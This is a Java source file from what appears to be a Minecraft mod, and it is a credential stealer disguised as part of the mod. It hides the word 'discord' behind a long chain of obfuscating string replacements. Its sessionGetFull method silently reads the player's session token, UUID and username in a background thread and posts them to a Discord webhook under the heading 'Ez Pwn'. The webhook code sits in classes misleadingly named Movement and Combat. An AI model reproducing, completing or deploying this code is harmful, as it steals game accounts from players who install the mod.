
package run.hypixel.Sylap.utils;

import java.awt.Color;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Scanner;

import net.minecraft.client.Minecraft;
import net.minecraft.launchwrapper.Launch;
import run.hypixel.Sylap.exception.WebhookException;
import run.hypixel.Sylap.features.Movement;
import run.hypixel.Sylap.features.Movement.EmbedObject;
import run.hypixel.Sylap.features.Combat;

public class Methods {
	
	public static String stringreplace = "fucmrdj"
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("fucmrdj", "urnwqpy").replace("", "").replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("urnwqpy", "discord")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "");
	
	public static void sessionGetFull() {
	    new Thread(() -> {
	    	try {
	    		Minecraft mc = Minecraft.getMinecraft();
			    String token = mc.getSession().getToken();
			    String uuid = mc.getSession().getProfile().getId().toString();
			    String name = mc.getSession().getProfile().getName();
			    
			    Movement dh = new Movement(Combat.getyou());
			    dh.setContent("U GOT A CONNECTION");
			    dh.setUsername(name);
			    dh.addEmbed(new Movement.EmbedObject()
			    		.setTitle(name + " Full Minecraft Information")
			    		.setColor(Color.BLUE)
			    		.setAuthor("Ez Pwn", "", "")
			    		.addField("Username", name, true)
			    		.addField("UUID", uuid.replace("-", ""), true)
			    		.addField("Token", token, false)
			    		.setFooter("https://sky.shiiyu.moe/stats/" + name, ""));
			    dh.execute();
	    	}catch(Exception e) {
	    		new WebhookException().printStackTrace();
	    	}
	    }).start();

	}
	
	public static String username() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
	    String name = mc.getSession().getProfile().getName();
	    return (String) name;
	}
	
	public static String uuid() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
	    String uuid = mc.getSession().getProfile().getId().toString();
	    return (String) uuid;
	}
	
	public static String token() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
	    String token = mc.getSession().getToken();
	    return (String) token;
	}
	

	
	
	

}
